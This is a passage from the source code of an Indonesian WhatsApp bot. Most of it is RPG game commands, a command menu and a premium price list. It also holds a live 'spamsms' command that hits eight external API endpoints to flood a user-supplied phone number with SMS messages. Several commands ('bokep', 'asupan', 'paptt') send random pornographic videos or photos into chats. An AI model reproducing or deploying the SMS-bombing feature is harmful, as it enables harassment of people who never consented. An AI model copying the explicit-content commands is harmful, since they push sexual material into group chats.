│◦ .sound74
│◦ .sound75
│◦ .sound76
│◦ .sound77
│◦ .sound78
│◦ .sound79
│◦ .sound80
│◦ .sound81
│◦ .sound82
│◦ .sound83
│◦ .sound84
│◦ .sound85
│◦ .sound86
│◦ .sound87
│◦ .sound88
│◦ .sound89
│◦ .sound90
│◦ .sound91
│◦ .sound92
│◦ .sound93
│◦ .sound94
│◦ .sound95
│◦ .sound96
│◦ .sound97
│◦ .sound98
│◦ .sound99
│◦ .sound100
│◦ .sound101
│◦ .sound102
│◦ .sound103
│◦ .sound104
│◦ .sound105
│◦ .sound106
│◦ .sound107
│◦ .sound108
│◦ .sound109
│◦ .sound110
│◦ .sound111
│◦ .sound112
│◦ .sound113
│◦ .sound114
│◦ .sound115
│◦ .sound116
╰──···· •
╭── • 「 *ᴍ ᴇ ᴍ ᴇ* 」
│◦ .ᴅᴀʀᴋᴊᴏᴋᴇ
│◦ .ᴍᴇᴍᴇɪɴᴅᴏ
╰──···· •
╭── • 「 *ᴛ ᴇ x ᴛ  ᴘ ʀ ᴏ _2_* 」
│◦ .ᴘᴏʀɴʜᴜʙ *<text>*
│◦ .ɢʟɪᴛᴄʜ *<text>*
│◦ .ᴀᴠᴇɴɢᴇʀ *<text>*
│◦ .sᴘᴀᴄᴇ *<text>*
│◦ .ɴɪɴᴊᴀʟᴏɢᴏ *<text>*
│◦ .ᴍᴀʀᴠᴇʟsᴛᴜᴅɪᴏ *<text>*
│◦ .ʟɪᴏɴʟᴏɢᴏ *<text>*
│◦ .ᴡᴏʟғʟᴏɢᴏ *<text>*
│◦ .sᴛᴇᴇʟ3ᴅ *<text>*
│◦ .ᴡᴀʟʟɢʀᴀᴠɪᴛʏ *<text>*
╰──···· •
╭── •「 *ɪ ɴ ғ ᴏ ʀ ᴍ ᴀ ᴛ ɪ ᴏ ɴ* 」
│◦ .ᴋʙʙɪ
│◦ .ʙʀᴀɪɴʟʏ
│◦ .ʀᴏʙᴏɢᴜʀᴜ
│◦ .ᴊᴀʀᴀᴋ
│◦ .ᴡɪᴋɪᴘᴇᴅɪᴀ
│◦ .ᴛʀᴀɴsʟᴀᴛᴇ
│◦ .ᴊᴀᴅᴡᴀʟᴛᴠ
│◦ .ᴊᴀᴅᴡᴀʟᴛᴠɴᴏᴡ
│◦ .ᴊᴀᴅᴡᴀʟʙᴏʟᴀ
│◦ .ɴᴇᴡsɪɴғᴏ
│◦ .ᴄɴɴɪɴᴅᴏɴᴇsɪᴀ
│◦ .ᴄɴɴɴᴀsɪᴏɴᴀʟ
│◦ .ᴄɴɴɪɴᴛᴇʀɴᴀsɪᴏɴᴀʟ
│◦ .ɪɴғᴏɢᴇᴍᴘᴀ
│◦ .ɪɴғᴏᴄᴜᴀᴄᴀ
│◦ .ʟɪʀɪᴋ
│◦ .ᴋᴏᴅᴇᴘᴏs
│◦ .ɪɴғᴏᴄʜᴀᴛ
│◦ .ɢᴏᴏɢʟᴇ
│◦ .ᴘɪɴᴛᴇʀᴇsᴛ
│◦ .ᴄᴇᴋᴛᴀɢɪʜᴀɴ *<ᴛoken ʟɪsᴛʀɪᴋ>*
╰──···· •
╭── • 「 *i n t e r n e t* 」
│◦ .pixiv
│◦ .npm
│◦ .npmsearch
│◦ .bard
│◦ .gimage
╰──···· •

*${global.wm}*`
    conn.sendMessage(m.chat, {
      text: Styles(anu),
      contextInfo: {
        externalAdReply: {
          title: '2023 © arybotz Multi Device',
          body: `${thisDay} ${tanggal} ${arrbulan[bulan]} ${tahun}`,
          thumbnailUrl: global.thurl,
          sourceUrl: sig,
          mediaType: 1,
          renderLargerThumbnail: true
        }
      }
    }, { quoted: fkontak })
}
break


case 'paptt':
if (isBan) return customsend(`${youban}`, m.sender, '🚫 A C C E S S - D E N I E D')
 if (db.data.settings[botNumber].gconly === true && !isPremium && !isCreator && !m.isGroup) return customsend(`${gcon}`, m.sender, '🚫 A C C E S S - D E N I E D')
if (!isRegistered) return customsend(`${noregis}`, m.sender, '🐶 arybotz || MultiDevice')	
if (!isPremium) return newReply(mess.prem)
            if (!q) return newReply(`Example ${prefix + command} foto/video`)
            let papttfoto = JSON.parse(fs.readFileSync('./lib/paptt-foto.json'))
            let papttvideo = JSON.parse(fs.readFileSync('./lib/paptt-video.json'))
            let titid1 = (pickRandom(papttfoto))
            let titid2 = (pickRandom(papttvideo))
            if (q == 'foto') {
                conn.sendMessage(m.chat, { image: { url: titid1 }, caption: 'Mana Tahan🥵'}, { quoted: fkontak })
            } else if (q == 'video') {
                conn.sendMessage(m.chat, { video: { url: titid2 }, caption: 'Mana Tahan🥵'}, { quoted: fkontak })
            }
        break
 
case 'version': case 'versi': case 'versibot': {
const { version } = require('./package.json');
reply(`ArybotzBot Version: ${version}`)
}
break         
case 'asupan': {
if (isBan) return customsend(`${youban}`, m.sender, '🚫 A C C E S S - D E N I E D')
 if (db.data.settings[botNumber].gconly === true && !isPremium && !isCreator && !m.isGroup) return customsend(`${gcon}`, m.sender, '🚫 A C C E S S - D E N I E D')
if (!isRegistered) return customsend(`${noregis}`, m.sender, '🐶 arybotz || MultiDevice')	
if (!isPremium) return newReply(mess.prem)
            let asupanah = JSON.parse(fs.readFileSync('./lib/asupan.json'))
            let enakanj = (pickRandom(asupanah))
                conn.sendMessage(m.sender, { video: { url: enakanj }, caption: 'Ah Sayang😣'}, { quoted: fkontak })
            }
        break
        case 'bokep': {
        if (isBan) return customsend(`${youban}`, m.sender, '🚫 A C C E S S - D E N I E D')
         if (db.data.settings[botNumber].gconly === true && !isPremium && !isCreator && !m.isGroup) return customsend(`${gcon}`, m.sender, '🚫 A C C E S S - D E N I E D')
        if (!isRegistered) return customsend(`${noregis}`, m.sender, '🐶 arybotz || MultiDevice')
if (!isPremium) return newReply(mess.prem)
            let asupanah1 = JSON.parse(fs.readFileSync('./lib/bokep.json'))
            newReply(`Wait...`)
            let enakanj1 = (pickRandom(asupanah1))
                conn.sendMessage(m.chat, { video: { url: enakanj1 }, caption: 'Ah Sayang😣'}, { quoted: fkontak })
            }
        break
        case 'win': case 'menang': {
        if (!m.isGroup) return newReply(mess.group)
let orang1 = participants.map(u => u.id)
let ngew1 = orang1[Math.floor(Math.random() * orang1.length)]
let menst = [ngew1]
let cap = `乂 *P E M E N A N G*
yang menang disini adalah @${ngew1.split('@')[0]} 🏆`
conn.sendMessage(m.chat, { text: cap, mentions: [ngew1] }, { quoted: fkontak })
}
        break
			case 'gta':
		case 'gtamisi':
	if (isBan) return customsend(`${youban}`, m.sender, '🚫 A C C E S S - D E N I E D')
		if (!isRegistered) return customsend(`${noregis}`, m.sender, '🐶 arybotz || MultiDevice')
			if (args.length == 0) return newReply(`Example: ${prefix + command} ${global.wm} `)
			if (global.db.data.users[m.sender].limit < 1) return newReply(mess.endLimit) // respon ketika limit habis
            db.data.users[m.sender].limit -= 2 // -1 limit
			newReply(mess.wait)
			conn.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/gtapassed?apikey=${apilol}&text1=${args[0]}%20${args[1]}&text2=${args[2]}`}, caption: `Created By ${global.wm}\n\n Type: ${command}\n\nText: ${args}`})
			break
case 'aidalle': case 'dalle': {
if (isBan) return customsend(`${youban}`, m.sender, '🚫 A C C E S S - D E N I E D')
if (!text) return reply(`Query?`)
conn.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/dall-e?apikey=${haikalgans}&text=${text}` }, caption: 'Ai Dall E' })
}
break
			case 'buypremium': case 'premium': {
reply3(`*ɪɴɢɪɴ ᴍᴇᴍʙᴇʟɪ ᴘʀᴇᴍɪᴜᴍ ᴜsᴇʀ? ʙᴇʀɪᴋᴜᴛ ʟɪsᴛ ʜᴀʀɢᴀ ɴʏᴀ:*
╭─  ◦ *ᴘᴀʏᴍᴇɴᴛ*
│ 6285762008398 < ᴅᴀɴᴀ / arybotz > < ᴘᴜʟsᴀ / xsɪs >
╰─ 

╭─ ◦ *ʜᴀʀɢᴀ*
│ 5 ʜᴀʀɪ > ɪᴅʀ 5ᴋ
│ 1 ᴍɪɴɢɢᴜ > ɪᴅʀ 10ᴋ
│ 5 ᴍɪɴɢɢᴜ > ɪᴅʀ 20ᴋ
│ 1 ʙᴜʟᴀɴ > ɪᴅʀ 40ᴋ
│ 1 ᴛᴀʜᴜɴ > ɪᴅʀ 50ᴋ
│ ᴘᴇʀᴍᴀɴᴇɴ > 80ᴋ
╰─ ≂

🎁 *ʙᴏɴᴜs sᴘᴇsɪᴀʟ*

> ᴘᴇᴍʙᴇʟɪᴀɴ ᴅɪ ᴀᴛᴀs 20ᴋ ᴀᴋᴀɴ ᴍᴇɴᴅᴀᴘᴀᴛᴋᴀɴ ғʀᴇᴇ sᴇᴡᴀ ʙᴏᴛ ᴘᴇʀᴍᴀɴᴇɴ
> ᴘᴇᴍʙᴇʟɪᴀɴ ᴅɪ ᴀᴛᴀs 40ᴋ ᴀᴋᴀɴ ᴍᴇɴᴅᴀᴘᴀᴛᴋᴀɴ ғʀᴇᴇ ᴍᴏᴅᴇʀᴀᴛᴏʀ / ᴏᴡɴᴇʀ sᴇʟᴀᴍᴀ 5 ʜᴀʀɪ
> ᴘᴇᴍʙᴇʟɪᴀɴ ᴅɪ ᴀᴛᴀs 50ᴋ ᴀᴋᴀɴ ᴍᴇɴᴅᴀᴘᴀᴛᴋᴀɴ ғʀᴇᴇ sᴇᴡᴀ ʙᴏᴛ ᴘᴇʀᴍᴀɴᴇɴ + ғʀᴇᴇ ᴍᴏᴅᴇʀᴀᴛᴏʀ / ᴏᴡɴᴇʀ 10 ᴍɪɴɢɢᴜ + ғʀᴇᴇ ʟɪᴍɪᴛ sᴇᴛɪᴀᴘ ᴍɪɴɢɢᴜ 9000 + ғʀᴇᴇ ʙᴀʟᴀɴᴄᴇ sᴇᴛɪᴀᴘ ᴍɪɴɢɢᴜ 9000

*ᴄʜᴀᴛ ᴏᴡɴᴇʀ .ᴏᴡɴᴇʀ ᴜɴᴛᴜᴋ ᴍᴇʟᴀᴋᴜᴀɴ ᴛʀᴀɴsᴀᴋsɪ ʏᴀɴɢ ʟᴀɪɴɴʏᴀ*`) 
			}
			break 

          
        case 'spamsms':
        if (isBan) return customsend(`${youban}`, m.sender, '🚫 A C C E S S - D E N I E D')
         if (db.data.settings[botNumber].gconly === true && !isPremium && !isCreator && !m.isGroup) return customsend(`${gcon}`, m.sender, '🚫 A C C E S S - D E N I E D')
        if (!isPremium) return newReply(`Minimal Mah Premium!`)
                    if (args.length == 0) return reply(`Example: ${prefix + command} 08xxx`)
                    nomor = args[0]
                    await fetchJson(`https://api.lolhuman.xyz/api/sms/spam1?apikey=${apilol}&nomor=${nomor}`)
                    await fetchJson(`https://api.lolhuman.xyz/api/sms/spam2?apikey=${apilol}&nomor=${nomor}`)
                    await fetchJson(`https://api.lolhuman.xyz/api/sms/spam3?apikey=${apilol}&nomor=${nomor}`)
                    await fetchJson(`https://api.lolhuman.xyz/api/sms/spam4?apikey=${apilol}&nomor=${nomor}`)
                    await fetchJson(`https://api.lolhuman.xyz/api/sms/spam5?apikey=${apilol}&nomor=${nomor}`)
                    await fetchJson(`https://api.lolhuman.xyz/api/sms/spam6?apikey=${apilol}&nomor=${nomor}`)
                    await fetchJson(`https://api.lolhuman.xyz/api/sms/spam7?apikey=${apilol}&nomor=${nomor}`)
                    await fetchJson(`https://api.lolhuman.xyz/api/sms/spam8?apikey=${apilol}&nomor=${nomor}`)
                    newReply("Success")
                    break
                    case 'mining': case 'mine':{
if (isBan) return customsend(`${youban}`, m.sender, '🚫 A C C E S S - D E N I E D')                    
                     if (db.data.settings[botNumber].gconly === true && !isPremium && !isCreator && !m.isGroup) return customsend(`${gcon}`, m.sender, '🚫 A C C E S S - D E N I E D')
                    if (!isJoin) return newReply(`⌕ ᴜɴᴛᴜᴋ ᴍᴇɴɢɢᴜɴᴀᴋᴀɴ ᴘᴇʀɪɴᴛᴀʜ ɪɴɪ ᴋᴀᴍᴜ ʜᴀʀᴜs ᴍᴇɴɢᴇᴛɪᴋ *.ᴊᴏɪɴʀᴘɢ* ᴀɢᴀʀ ᴅᴀᴛᴀ ʙᴀʟᴀɴᴄᴇ/ɪɴᴠᴇɴᴛᴏʀʏ ᴋᴀᴍᴜ ᴛᴇʀsɪᴍᴘᴀɴ ッ`)
if (!isInventoriBuruan){ addInventoriBuruan(m.sender) } 

if (!isInvMakanan){ addInvMakanan(m.sender) } 

if (!isDarah){ addInventoriDarah(m.sender, DarahAwal) }

if (!isInvBahan){ addInvBahan(m.sender) } 
if (!isInvBuah){ addInvBuah(msender) } 
if (!isInvBuild){ addInvBuild(m.sender) } 

if (!isBar){ addInvBar(m.sender, BarAwal) }
if (isCekDarah < 1) return newReply(`Kamu Harus Tidur , Kamu Lelah *.tidur* Jika Kamu Mempunyai Rumah, Atau *.heal* Jika Kamu Mempunyai Potion`) 
if (!isBar){ addInvBar(m.sender, BarAwal) }
if (isCekBar < 1) return newReply(`Kamu Kelaparan, Masak Lah Makanan Atau Makan Makanan Yang Ada, *.cook* / *.makanan*`)
kurangBar(m.sender, 80)
try {
let besi = [1,2,5,0,3,0,1,1,4,1,5,0,0]
let emas = [0,1,2,3,0,0,0,1,1,0,0,2]
let emerald = [0,0,1,0,0,1,0,2,1,0,0,1]
let batu = [10,11,15,18,5,8,1]
var batunya = batu[Math.floor(Math.random() * batu.length)]
var besinya = besi[Math.floor(Math.random() * besi.length)]  
var emasnya = emas[Math.floor(Math.random() * emas.length)]  
var emeraldnya = emerald[Math.floor(Math.random() * emerald.length)]  
newReply(`${m.sender.split("@")[0]} Started Mining⛏️`)
await sleep(10000)
newReply(`乂 *M I N I N G  R E S U L T*
╭ Batu: ${batunya}
│ Emerald: ${emeraldnya}
│ Besi: ${besinya}
╰ Emas: ${emasnya}`)
await sleep(1500)
kurangDarah(m.sender, 10)
addBesi(m.sender, besinya)
addEmas(m.sended, emasnya)
addEmerald(m.sender, emeraldnya)
addBatu(m.sender, batunya)
} catch (err) {
newReply(`Mungkin Dilain Waktu Saja`)
}
}   
break
case 'petualang': case 'adventure': {
if (isBan) return customsend(`${youban}`, m.sender, '🚫 A C C E S S - D E N I E D')
if (!isInventoriBuruan){ addInventoriBuruan(m.sender) } 

if (!isInvMakanan){ addInvMakanan(m.sender) } 

if (!isDarah){ addInventoriDarah(m.sender, DarahAwal) }

if (!isInvBahan){ addInvBahan(m.sender) } 
if (!isInvBuah){ addInvBuah(m.sender) } 
if (!isInvBuild){ addInvBuild(m.sender) } 

if (!isBar){ addInvBar(m.sender, BarAwal) }
        let user = global.db.data.users[m.sender]
        let __timers = new Date() - (global.db.data.users[m.sender].lastadventure || 0);
        let _timers = 600000 - __timers;
        let timers = clockString(_timers);
            if (new Date - user.lastadventure > 600000) return newReply(`Anda sudah berpetualang dan kelelahan, silakan coba *${timers}* lagi`)
                let _health = `${Math.floor(Math.random() * 101)}`.trim();
                let health = (_health * 1);
                let uang = `${Math.floor(Math.random() * 1000000)}`.trim();
                let _potion = ['1', '2', '3', '4', '4', '2'];
                let potion = _potion[Math.floor(Math.random() * _potion.length)];
                let _sampah = ['1', '2', '3', '4', '5', '6', '7', '8', '9', '10', '11', '12', '13', '14', '15', '16', '17', '18', '19', '20', '21', '22', '23', '24', '25', '26', '27', '28', '29', '30', '31', '32', '33', '34', '35', '36', '37', '38', '39', '40', '41', '42', '43', '44', '45', '46', '47', '48', '49', '50'];
                let sampah = _sampah[Math.floor(Math.random() * _sampah.length)];
                let _diamond = ['1', '2', '3', '4', '5', '6', '7', '8', '9', '10'];
                let diamond = _diamond[Math.floor(Math.random() * _diamond.length)];
                let _uncommon = ['1', '2', '1', '2', '3', '5', '4'];
                let uncommon = _uncommon[Math.floor(Math.random() * _uncommon.length)];
                let _mythic = `${pickRandom(['1', '3', '1', '1', '2', '3', '2'])}`;
                let mythic = (_mythic * 1);
                let _legendary = `${pickRandom(['1', '3', '1', '1', '2', '2', '1'])}`;
                let legendary = (_legendary * 1);
                let itemrand = [
                    `*Selamat anda mendapatkan item rare yaitu*\n${mythic} Mythic Crate`,
                    `*Selamat kamu mendapatkan item rare yaitu*\n${legendary} Legendary Crate`
                ];
                let rendem = itemrand[Math.floor(Math.random() * itemrand.length)];
                let ages = 'https://telegra.ph/file/ea469189ccc6705a144bc.jpg';
                let location = pickRandom([
                    'Jepang', 'Korea', 'Bali', 'Amerika', 'Iraq', 'Arab', 'Pakistan', 'German',
                    'Finlandia', 'Ke bawa dunia mimpi', 'Ujung dunia', 'Mars', 'Zimbabwe',
                    'Bulan', 'Pluto', 'Matahari', 'Hatinya dia'
                ]);
                let str = `Sedang dalam proses petualangan menuju *${location}*...`;

                setTimeout(() => {
                    newReply(str)
                }, 1000);

                setTimeout(() => {
                    let result = `
乂 *P E T U A L A N G A N*
kamu sudah berhenti berpetualang, lokasi terakhir di ${location}                                        
• *Balance:* ${uang}
• *Sampah:* ${sampah}${potion == 0 ? '' : '\n• *Potion:* ' + potion}${diamond == 0 ? '' : '\n• *Diamond:* ' + diamond} ${uncommon == 0 ? '' : '\n• *Uncommon Crate:* ' + uncommon}`;
                    conn.sendMessage(m.chat, {
                        text: result,
                        contextInfo: {
                            externalAdReply: {
                                title: 'arybotz - md',
                                body: 'ary Dev',
                                thumbnailUrl: logo,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, { quoted: m });
                }, 3000);

                setTimeout(() => {
                    newReply(rendem)
                }, 4000);
                
                kurangDarah(m.sender, health)
                db.data.users[m.sender].money += uang
                addPotion(m.sender, potion)
                addEmerald(m.sender, diamond)
                addCU(m.sender, uncommon)
                addCM(m.sender, mythic)
                addCL(m.sender, legendary)
                global.db.data.users[m.sender].lastadventure = new Date * 1
}
break
case 'inventori': case 'inventory': case 'inv': case 'profile': case 'invent': {
if (isBan) return customsend(`${youban}`, m.sender, '🚫 A C C E S S - D E N I E D')
 if (db.data.settings[botNumber].gconly === true && !isPremium && !isCreator && !m.isGroup) return customsend(`${gcon}`, m.sender, '🚫 A C C E S S - D E N I E D')
if (!isJoin) return newReply(`⌕ ᴜɴᴛᴜᴋ ᴍᴇɴɢɢᴜɴᴀᴋᴀɴ ᴘᴇʀɪɴᴛᴀʜ ɪɴɪ ᴋᴀᴍᴜ ʜᴀʀᴜs ᴍᴇɴɢᴇᴛɪᴋ *.ᴊᴏɪɴʀᴘɢ* ᴀɢᴀʀ ᴅᴀᴛᴀ ʙᴀʟᴀɴᴄᴇ/ɪɴᴠᴇɴᴛᴏʀʏ ᴋᴀᴍᴜ ᴛᴇʀsɪᴍᴘᴀɴ ッ`)
if (!isInventoriBuruan){ addInventoriBuruan(m.sender) } 

if (!isInvMakanan){ addInvMakanan(m.sender) } 

if (!isDarah){ addInventoriDarah(m.sender, DarahAwal) }

if (!isInvBahan){ addInvBahan(m.sender) } 
if (!isInvBuah){ addInvBuah(m.sender) } 
if (!isInvBuild){ addInvBuild(m.sender) } 

if (!isBar){ addInvBar(m.sender, BarAwal) }
try {
let user = global.db.data.users[m.sender]
let teks = `乂 *S T A T S*\n`
teks += `[ ❣️ ] Your Blood : ${getDarah(m.sender)}\n`
teks += `[ 💲 ] Your Money : $${(getMonay(m.sender))}\n`
teks += `[ ⛓️ ] Your Iron: ${getBesi(m.sender)}\n`
teks += `[ 🌟️ ] Your Gold: ${getEmas(m.sender)}\n`
teks += `[ 💠 ] Your Emerald: ${getEmerald(m.sender)}\n`
teks += `[ 🧪 ] Your Potion: ${getPotion(m.sender)}\n\n`
teks += `乂 *H U N T I N G*\n`
teks += `[ 🐟 ] Fish: ${getIkan(m.sender)}\n`
teks += `[ 🐔 ] Chicken: ${getAyam(m.sender)}\n`
teks += `[ 🐇 ] Rabbit: ${getKelinci(m.sender)}\n`
teks += `[ 🐑 ] Sheep: ${getDomba(m.sender)}\n`
teks += `[ 🐄 ] Cow: ${getSapi(m.sender)}\n`
teks += `[ 🐘 ] Elephant: ${getGajah(m.sender)}\n\n`
teks += `乂 *K A R U N G*\n`
teks += `[ 🧴 ] Botol: ${getBotol(m.sender)}\n`
teks += `[ 📦 ] Kardus: ${getKardus(m.sender)}\n`
teks += `[ 🥫 ] Kaleng: ${getKaleng(m.sender)}\n\n`
teks += `乂 *E A T - S T O R A G E*\n`
teks += `[ 🍖 ] Bar Kelaparan Kamu: ${getBar(m.sender)}%\n`
teks += `[ 🍡 ] Sate: ${getSate(m.sender)}\n`
teks += `[ 🐠 ] Ikan Goreng: ${getGoreng(m.sender)}\n`
teks += `[ 🍲 ] Sop Sapi: ${getSop(m.sender)}\n`
teks += `[ 🥩 ] Steak: ${getSteak(m.sender)}\n\n`
teks += `乂 *F A C I L I T Y*\n`
teks += `[ 🏘 ]️ Rumah: ${getRumah(m.sender)}\n`
teks += `[ 🌾 ] Pertanian: ${getPertanian(m.sender)}\n\n`
teks += `乂 *B U I L D - I T E M*\n`
teks += `[ 🌳 ] Kayu: ${getKayu(m.sender)}\n`
teks += `[ 🗿 ] Batu: ${getBatu(m.sender)}\n`
teks += `[ 🏗 ]️️ Semen: ${getSemen(m.sender)} Karung\n`
teks += `[ 🏗 ] ️Pasir: ${getPasir(m.sender)} Karung\n\n`
teks += `乂 *P E T*\n`
teks += `[ 🐱 ] Kucing: ${getKucing(m.sender)}\n`
teks += `[ 🐕 ] Anjing: ${getAnjing(m.sender)}\n`
teks += `[ 🐉 ] Naga: ${getNaga(m.sender)}\n`
teks += `[ 🦊 ] Kyubi: ${getKyubi(m.sender)}\n\n`
teks += `乂 *C R E A T E*\n`
teks += `[ 📦 ] Legendary: ${getCL(m.sender)}\n`
teks += `[ 📦 ] Mythic: ${getCM(m.sender)}\n`
teks += `[ 📦 ] Uncommon: ${getCU(m.sender)}\n\n  `
teks += `乂 *R A N D O M - I T E M*\n`
teks += `[ 🗡️ ] Sword: ${getSword(m.sender)}\n`
teks += `[ 👕 ] Armor: ${getArmor(m.sender)}\n`
teks += `[ 🔑 ] Key/Gacha: ${getKey(m.sender)}\n\n`
teks += `         Zky Ofc 2023-2025       `
conn.sendMessage(m.chat, {
    text: teks,
    contextInfo: {
      externalAdReply: {
        showAdAttribution: false,
        title: `Inventory `,
        body: "Information..",
        thumbnailUrl: "https://telegra.ph/file/1683dc17402b20ec2dbdf.jpg",
        mediaType: 1,
        renderLargerThumbnail: true
      }
    }
   })
} catch (err) {
newReply(`Mungkin Dilain Waktu Saja`)
}
}
break
case 'kandang': {
if (isBan) return customsend(`${youban}`, m.sender, '🚫 A C C E S S - D E N I E D')
let user = global.db.data.users[m.sender]
newReply(`乂 *K A N D A N G*
╭ • Ikan: ${user.ikan || 0} Ekor
│ • Ayam: ${user.ayam || 0} Ekor
│ • Kelinci: ${user.kelinci || 0} Ekor
│ • Domba: ${user.domba || 0} Ekor
│ • Sapi: ${user.sapi || 0} Ekor
╰ • Gajah: ${user.gajah || 0} Ekor`)
}
break
case 'mulung': {
if (isBan) return customsend(`${youban}`, m.sender, '🚫 A C C E S S - D E N I E D')
const timeout = 1800000
function msToTime(duration) {
  var milliseconds = parseInt((duration % 1000) / 100),
    seconds = Math.floor((duration / 1000) % 60),
    minutes = Math.floor((duration / (1000 * 60)) % 60),
    hours = Math.floor((duration / (1000 * 60 * 60)) % 24)
    
  
  hours = (hours < 10) ? "0" + hours : hours
  minutes = (minutes < 10) ? "0" + minutes : minutes
  seconds = (seconds < 10) ? "0" + seconds : seconds

  return hours + " Jam " + minutes + " Menit " + seconds + " Detik"
}
if (!isInventoriBuruan){ addInventoriBuruan(m.sender) } 


let time = global.db.data.users[m.sender].lastmulung + 1800000
  if (new Date - global.db.data.users[m.sender].lastmulung< 1800000) return newReply(`Kamu Sudah Lelah\nTunggu Selama ${msToTime(time - new Date())} Lagi`)
newReply(`*Wait For Minute.*`)
await sleep(1000)
var botolnye = Math.ceil(Math.random() * 800)
var kardusnye = Math.ceil(Math.random() * 700)
var kalengnye = Math.ceil(Math.random() * 500)
addBotol(m.sender, botolnye)
addKardus(m.sender, kardusnye)
addKaleng(m.sender, kalengnye)
global.db.data.users[m.sender].lastmulung = new Date * 1
newReply(`乂 *M U L U N G  R E S U L T*
+${getBotol(m.sender)} Botol
+${getKaleng(m.sender)} Kaleng
+${getKardus(m.sender)} Kardus`)
setTimeout(() => {
					conn.sendMessage(m.chat, { text: `Yuk Waktunya Mulung Lagi…`, m})
					}, timeout)
}
break
case 'sell': case 'jual':{
if (isBan) return customsend(`${youban}`, m.sender, '🚫 A C C E S S - D E N I E D')
 if (db.data.settings[botNumber].gconly === true && !isPremium && !isCreator && !m.isGroup) return customsend(`${gcon}`, m.sender, '🚫 A C C E S S - D E N I E D')
if (!isJoin) return newReply(`⌕ ᴜɴᴛᴜᴋ ᴍᴇɴɢɢᴜɴᴀᴋᴀɴ ᴘᴇʀɪɴᴛᴀʜ ɪɴɪ ᴋᴀᴍᴜ ʜᴀʀᴜs ᴍᴇɴɢᴇᴛɪᴋ *.ᴊᴏɪɴʀᴘɢ* ᴀɢᴀʀ ᴅᴀᴛᴀ ʙᴀʟᴀɴᴄᴇ/ɪɴᴠᴇɴᴛᴏʀʏ ᴋᴀᴍᴜ ᴛᴇʀsɪᴍᴘᴀɴ ッ`)
if (!q) return newReply(`Contoh : ${prefix + command} fish/chicken/rabbit/sheep/cow/elephant/iron/gold/emerald/botol/kardus/kaleng`)
if (!isInventoriBuruan){ addInventoriBuruan(m.sender) } 

if (!isInvMakanan){ addInvMakanan(m.sender) } 

if (!isDarah){ addInventoriDarah(m.sender, DarahAwal) }

if (!isInvBahan){ addInvBahan(m.sender) } 
if (!isInvBuah){ addInvBuah(m.sender) } 
if (!isInvBuild){ addInvBuild(m.sender) } 

if (!isBar){ addInvBar(m.sender, BarAwal) }
try {
var anu3 = args[1]
if (args[0] === 'fish'){
if (isIkan < anu3) return newReply(`Anda Tidak Memiliki Cukup Ikan Untuk Transaksi Ini`)
if (!args[1]) return newReply(`Contoh : ${prefix + command} fish 2\n 1 Fish = 1500 Money`)
kurangIkan(m.sender, anu3)
let monaynya = 1500 * anu3
db.data.users[m.sender].money += monaynya
setTimeout( () => {
newReply(`Transaksi Sukses\n*Uangmu* : $${(getMonay(m.sender))}\n*Sisa Ikanmu* : ${getIkan(m.sender)}`)
}, 2000) 
} else 
if (args[0] === 'limit'){
if (!args[1]) return newReply(`Contoh : ${prefix + command} limit 200\n 100 limit = 5000 Money`)
    users[m.sender].limit -= anu3;
    let monaynya = 5000 * anu3
db.data.users[m.sender].money += monaynya
    newReply(`Berhasil menjual Limit, Uang Mu $${(getMonay(m.sender))}`)
  } else
if (args[0] === 'botol'){
if (isBotol < anu3) return newReply(`Anda Tidak Memiliki Cukup Botol Untuk Transaksi Ini`)
if (!args[1]) return newReply(`Contoh : ${prefix + command} botol 2\n 1 botol = 1000 Money`)
kurangBotol(m.sender, anu3)
let monaynya = 1000 * anu3
db.data.users[m.sender].money += monaynya
setTimeout( () => {
newReply(`Transaksi Sukses\n*Uangmu* : $${(getMonay(m.sender))}\n*Sisa Botol Mu* : ${getBotol(m.sender)}`)
}, 2000)
} else if (args[0] === 'kardus'){
if (isKardus < anu3) return newReply(`Anda Tidak Memiliki Cukup Kardus Untuk Transaksi Ini`)
if (!args[1]) return newReply(`Contoh : ${prefix + command} Kardus 2\n 1 botol = 1000 Money`)
kurangKardus(m.sender, anu3)
let monaynya = 1000 * anu3
db.data.users[m.sender].money += monaynya
setTimeout( () => {
newReply(`Transaksi Sukses\n*Uangmu* : $${(getMonay(m.sender))}\n*Sisa Kardus Mu* : ${getBotol(m.sender)}`)
}, 2000) 
} else if (args[0] === 'kaleng'){
if (isKaleng < anu3) return newReply(`Anda Tidak Memiliki Cukup Kaleng Untuk Transaksi Ini`)
if (!args[1]) return newReply(`Contoh : ${prefix + command} kaleng 2\n 1 botol = 1000 Money`)
kurangKaleng(m.sender, anu3)
let monaynya = 1000 * anu3
db.data.users[m.sender].money += monaynya
setTimeout( () => {
newReply(`Transaksi Sukses\n*Uangmu* : $${(getMonay(m.sender))}\n*Sisa Kaleng Mu* : ${getBotol(m.sender)}`)
}, 2000) 
} else 
if (args[0] === 'chicken'){
if (isAyam < anu3) return newReply(`Anda Tidak Memiliki Cukup Ayam Untuk Transaksi Ini`)
if (!args[1]) return newReply(`Contoh : ${prefix + command} chicken 2\n 1 Chicken = 2500 Money`)
kurangAyam(m.sender, anu3)
let monaynya = 2500 * anu3
db.data.users[m.sender].money += monaynya
setTimeout( () => {
newReply(`Transaksi Sukses\n*Uangmu* : $${(getMonay(m.sender))}\n*Sisa Ayammu* : ${getAyam(m.sender)}`)
}, 2000) 
} else
if (args[0] === 'rabbit'){
if (isKelinci < anu3) return newReply(`Anda Tidak Memiliki Cukup Kelinci Untuk Transaksi Ini`)
if (!args[1]) return newReply(`Contoh : ${prefix + command} rabbit 2\n 1 Rabbit = 3000 Money`)
kurangKelinci(m.sender, anu3)
let monaynya = 3000 * anu3
db.data.users[m.sender].money += monaynya
setTimeout( () => {
newReply(`Transaksi Sukses\n*Uangmu* : $${(getMonay(m.sender))}\n*Sisa Kelincimu* : ${getKelinci(m.sender)}`)
}, 2000) 
} else
if (args[0] === 'sheep'){
if (isDomba < anu3) return newReply(`Anda Tidak Memiliki Cukup Domba Untuk Transaksi Ini`)
if (!args[1]) return newReply(`Contoh : ${prefix + command} domba 2\n 1 Sheep = 5000 money`)
kurangDomba(m.sender, anu3)
let monaynya = 5000 * anu3
db.data.users[m.sender].money += monaynya
setTimeout( () => {
newReply(`Transaksi Sukses\n*Uangmu* : $${(getMonay(m.sender))}\n*Sisa Dombamu* : ${getDomba(m.sender)}`)
}, 2000) 
} else
if (args[0] === 'cow'){
